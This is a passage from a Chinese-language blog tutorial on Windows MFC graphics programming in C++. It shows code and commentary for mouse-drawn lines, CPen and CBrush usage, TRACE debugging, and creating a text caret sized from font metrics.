class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">m_stop = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">m_cur = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正构造函数不要浪费，避免不必要的错误，就都从0，0坐标开始初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">m_status = TRUE;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">m_status = FALSE;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按下和释放不需要怎么改动。</p><p>在鼠标移动消息中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line">m_cur = point;<span class="comment">//让m_cur = 当前的鼠标坐标。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于这个刷新，它会自动触发函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的绘图代码才是我们需要添加的，前面不用管，前面的就是相当于一个刷新白板的操作。<br>也就是我们之前提到过的，最大化和最小化的时候，之前画的线条就消失了，其实就是触发了重绘没有保存。</p><p><code>InvalidateRect</code>会调用<code>OnDraw</code>，在我们没有重写<code>OnDraw</code>的时候，默认操作就是重绘白板。</p><p>一个m_start和m_stop和m_cur只能完整的记录一条线。如果想要画多条，就要用到列表方式去控制。</p><hr><h2 id="画笔"><a href="#画笔" class="headerlink" title="画笔"></a>画笔</h2><p>之前的画线，它的粗细和颜色和形状都不能调整。所以可以尝试修改这些。</p><p>用画笔自然也要用它封装好的类，CPen</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPen</span> : <span class="keyword">public</span> CGdiObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CPen)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> CPen* PASCAL <span class="title">FromHandle</span><span class="params">(HPEN hPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="built_in">CPen</span>();</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor);</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span><br><span class="line"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>);</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePen</span><span class="params">(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePen</span><span class="params">(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePenIndirect</span><span class="params">(LPLOGPEN lpLogPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">HPEN</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetLogPen</span><span class="params">(LOGPEN* pLogPen)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetExtLogPen</span><span class="params">(EXTLOGPEN* pLogPen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CPen</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里看到构造的时候有两个带参数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, COLORREF crColor);</span><br><span class="line"><span class="built_in">CPen</span>(<span class="type">int</span> nPenStyle, <span class="type">int</span> nWidth, <span class="type">const</span> LOGBRUSH* pLogBrush,</span><br><span class="line"><span class="type">int</span> nStyleCount = <span class="number">0</span>, <span class="type">const</span> DWORD* lpStyle = <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>刚学先用前者<br>style就是样式，那么具体有</p><ol><li>PS_SOLID    实线</li><li>PS_DASH    虚线</li><li>PS_DOT    点线</li><li>PS_DOTDASH    点划线</li></ol><p>转到定义之后注释其实也很详细的给出了样子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PS_SOLID            0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASH             1       <span class="comment">/* -------  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DOT              2       <span class="comment">/* .......  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASHDOT          3       <span class="comment">/* _._._._  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PS_DASHDOTDOT       4       <span class="comment">/* _.._.._  */</span></span></span><br></pre></td></tr></table></figure><p>width自然就是线宽了，一般的单位都是像素。传int就完事。<br>color颜色，表示起来就RGB(RED,GREE,BULR)按照ps那会的情况，数值应该是0-255，暂时没看这里能不能用十六进制的方式塞。</p><p>设置好了笔的属性，就该用这支笔去画。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">3</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);<span class="comment">//要把这个笔加入设备上下文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/019.png" class=""><p>可以看到粗细和颜色是有变化了，但是样式好像没看出变化。<br>越来越粗的话肯定是看不出变化的。那么改小一点<br><code>CPen pen(PS_DASH, 1, RGB(255, 0, 0));</code></p><img src="/2022/07/25/mfc01/020.png" class=""><p>可以看到了虚线效果。。。嘶，还挺麻烦。只能用一个像素点才能看到效果。</p><hr><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>这是一个调试的时候用的函数，可以在输出栏里面打印出一些需要的信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_cur);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/021.png" class=""><p>毕竟有的时候单步调试比较累，如果能隐约猜到，可以尝试打印看看是否有问题。</p><hr><h2 id="画刷"><a href="#画刷" class="headerlink" title="画刷"></a>画刷</h2><p>用过画图其实应该知道，画笔毕竟画的是点阵练成的线，而画刷画出来的是实心的对象。<br>一个点绘，一个填充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CBrush</span> : <span class="keyword">public</span> CGdiObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CBrush)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> CBrush* PASCAL <span class="title">FromHandle</span><span class="params">(HBRUSH hBrush)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="built_in">CBrush</span>();</span><br><span class="line"><span class="built_in">CBrush</span>(COLORREF crColor);             <span class="comment">// CreateSolidBrush</span></span><br><span class="line"><span class="built_in">CBrush</span>(<span class="type">int</span> nIndex, COLORREF crColor); <span class="comment">// CreateHatchBrush</span></span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CBrush</span><span class="params">(CBitmap* pBitmap)</span></span>;          <span class="comment">// CreatePatternBrush</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateSolidBrush</span><span class="params">(COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateHatchBrush</span><span class="params">(<span class="type">int</span> nIndex, COLORREF crColor)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateBrushIndirect</span><span class="params">(<span class="type">const</span> LOGBRUSH* lpLogBrush)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreatePatternBrush</span><span class="params">(CBitmap* pBitmap)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateDIBPatternBrush</span><span class="params">(HGLOBAL hPackedDIB, UINT nUsage)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateDIBPatternBrush</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* lpPackedDIB, UINT nUsage)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateSysColorBrush</span><span class="params">(<span class="type">int</span> nIndex)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">HBRUSH</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetLogBrush</span><span class="params">(LOGBRUSH* pLogBrush)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CBrush</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>CBrush即为c++中的画刷。而构造函数里面，有个是就放颜色就行的。</p><p>起步都一样，创建了之后添加到设备上下文。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"></span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="comment">// pDC-&gt;MoveTo(m_start);</span></span><br><span class="line"><span class="comment">// pDC-&gt;LineTo(m_cur);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充矩形</span></span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// pDC-&gt;MoveTo(m_start);</span></span><br><span class="line"><span class="comment">// pDC-&gt;LineTo(m_stop);</span></span><br><span class="line"></span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/022.png" class=""><p>其实就是从按下到释放的两个点延伸出去直至闭合形成一个图形。<br>至于填充的颜色，画刷初始化的时候选择绿色，则默认也为绿色，也就是说<code>pDC-&gt;FillRect(CRect(m_start, m_cur), &amp;brush);</code>后面的参数不选择画刷，用NULL，默认的颜色也是画刷的颜色。<br>也可以创建别的颜色的画刷对象，然后传递，这倒不是啥大问题。</p><p><code>FillRect</code>是填充矩形，那么还有别的几个，下次再整。</p><img src="/2022/07/25/mfc01/023.png" class=""><hr><h2 id="光标和文本"><a href="#光标和文本" class="headerlink" title="光标和文本"></a>光标和文本</h2><p>我们现在跑的这个mfc程序，虽然中间那个空白区域是一个编辑区域，但是前面的功能都是绘制，与传统本文编辑区域而言，他少了一个光标，还有行号或者是分层的感觉。</p><p>至于这个创建光标加在哪里，构造函数肯定不可行，因为窗口绑定有很多相关的东西，不代表你这个地方构造完成了，其它绑定窗口的东西并不一定全部起来了。放在ondraw里面也不合适，那里重绘的话太频繁了这个光标。</p><p>所有的windows程序和mfc程序<br>第一阶段都是构造的时候<br>第二阶段才到达create阶段，在这个时候才会把构造的对象和窗口句柄之类的绑定<br>第三阶段要么showWindow或者doModule，就是显示出这些程序的框架，也就是跑起来了<br>第四阶段大致就是destroy阶段，它这个时候就是去销毁掉窗口<br>第五阶段就是delete阶段，这个时候才是销毁掉构造的对象</p><p>所以构造什么的是肯定行不通了，就要用到Create消息<br>快捷操作就是类视图，选择CMFCPaintView，然后属性里面找到消息，选择create</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会得到这样一个模板。这个create消息是create完成之后广播到各个控件，然后调用自己的构造函数，然后去完成一些自定义的操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"><span class="built_in">CreateSolidCaret</span>(<span class="number">3</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">ShowCaret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在随便指定这个光标大小之后</p><img src="/2022/07/25/mfc01/024.png" class=""><p>截图所以不管他闪不闪了，不过因为这个数值是我们指定的，所以当输入的字体万一大于光标或者小于都会看着很奇怪，显然别的程序肯定是有自适应大小的解决方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CMFCPaintView::OnCreate</span><span class="params">(LPCREATESTRUCT lpCreateStruct)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( CView::<span class="built_in">OnCreate</span>(lpCreateStruct) == <span class="number">-1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">TEXTMETRIC tm;</span><br><span class="line">dc.<span class="built_in">GetTextMetrics</span>(&amp;tm);</span><br><span class="line"><span class="built_in">CreateSolidCaret</span>(<span class="number">2</span>, tm.tmHeight);</span><br><span class="line"><span class="built_in">ShowCaret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用了点稀奇古怪的感觉</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagTEXTMETRICW</span></span><br><span class="line">&#123;</span><br><span class="line">    LONG        tmHeight;</span><br><span class="line">    LONG        tmAscent;</span><br><span class="line">    LONG        tmDescent;</span><br><span class="line">    LONG        